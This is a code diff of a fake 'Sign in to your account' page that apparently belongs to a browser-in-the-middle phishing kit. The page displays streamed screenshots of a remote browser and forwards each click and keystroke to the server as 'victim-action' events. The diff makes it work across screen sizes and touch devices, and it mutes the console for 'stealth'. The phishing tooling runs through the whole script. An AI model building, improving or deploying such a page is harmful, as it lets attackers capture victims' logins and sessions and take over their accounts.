@@ -2,42 +2,91 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sign in to your account</title>
+    
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAICAAAAEAIADSAgAAFgAAAIlQTkcNChoKAAAADUlIRFIAAAAgAAAAIAgGAAAAc3p6DQAAAAFzUkdCAK7OHOkAAAAEZ0FNQQAAsPV8L3GVAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAZ0lEQVRYhe2W0QoAIAhD7f8/unvYQ6clS7pgHwaatpXpYpSImYmJiYmJiYmJiYmJiYmJicloZp6at6Lp9ZqZp+ataHq9Zual+SuaXq+ZeWn+iqbXa2Zemr+i6fWamZfmr2h6vWbmf7Ef570vS87pL9AAAAAASUVORK5CYII=">
+    
     <style>
-        body { background: #000; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: flex-start; }
-        #mirror { width: 100vw; height: auto; cursor: crosshair; -webkit-user-drag: none; user-select: none; }
-        .status-bar { position: absolute; opacity: 0; pointer-events: none; }
+        * { box-sizing: border-box; }
+        
+        body, html { 
+            background: #000; 
+            margin: 0; 
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+        }
+
+        /* Container ensures the image keeps its 16:9 aspect ratio without cropping */
+        #mirror { 
+            max-width: 100%; 
+            max-height: 100%; 
+            width: auto; 
+            height: auto; 
+            object-fit: contain; 
+            cursor: crosshair; 
+            image-rendering: -webkit-optimize-contrast;
+            -webkit-user-drag: none; 
+            user-select: none; 
+            -webkit-user-select: none;
+            touch-action: none; /* Prevents mobile browser from intercepting touches */
+        }
+
+        .status-bar { 
+            position: absolute; 
+            opacity: 0; 
+            pointer-events: none; 
+        }
     </style>
 </head>
 <body>
     <div class="status-bar"><span id="msg">IDLE</span></div>
+    
     <img id="mirror" src="" draggable="false" />
 
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <script>
+        // Mute browser console for production lab stealth
         (function() {
             const noop = () => {};
             ['log', 'debug', 'info', 'warn', 'error'].forEach(m => window.console[m] = noop);
         })();
 
-        const socket = io({ transports: ['websocket'], upgrade: false });
+        const socket = io({ 
+            transports: ['websocket'], 
+            upgrade: false,
+            reconnection: true 
+        });
+
         const img = document.getElementById('mirror');
 
         socket.on('browser-render', (data) => {
-            if (data.screenshot) img.src = 'data:image/jpeg;base64,' + data.screenshot;
+            if (data.screenshot) {
+                img.src = 'data:image/jpeg;base64,' + data.screenshot;
+            }
         });
 
-        img.addEventListener('click', (e) => {
+        // Click Logic (Now calibrated for responsive scaling)
+        img.addEventListener('pointerdown', (e) => {
             const rect = img.getBoundingClientRect();
+            
+            // Calculate ratio between the 1280x720 internal canvas and the actual displayed size
             const x = (e.clientX - rect.left) * (1280 / rect.width);
             const y = (e.clientY - rect.top) * (720 / rect.height);
+            
             socket.emit('victim-action', { type: 'click', x, y });
         });
 
         window.addEventListener('keydown', (e) => {
+            // Prevent scrolling on key actions
             const blocked = ["ArrowUp", "ArrowDown", "Space", "Tab"];
             if (blocked.includes(e.code)) e.preventDefault();
+            
             socket.emit('victim-action', { type: 'key', key: e.key });
         });
     </script>
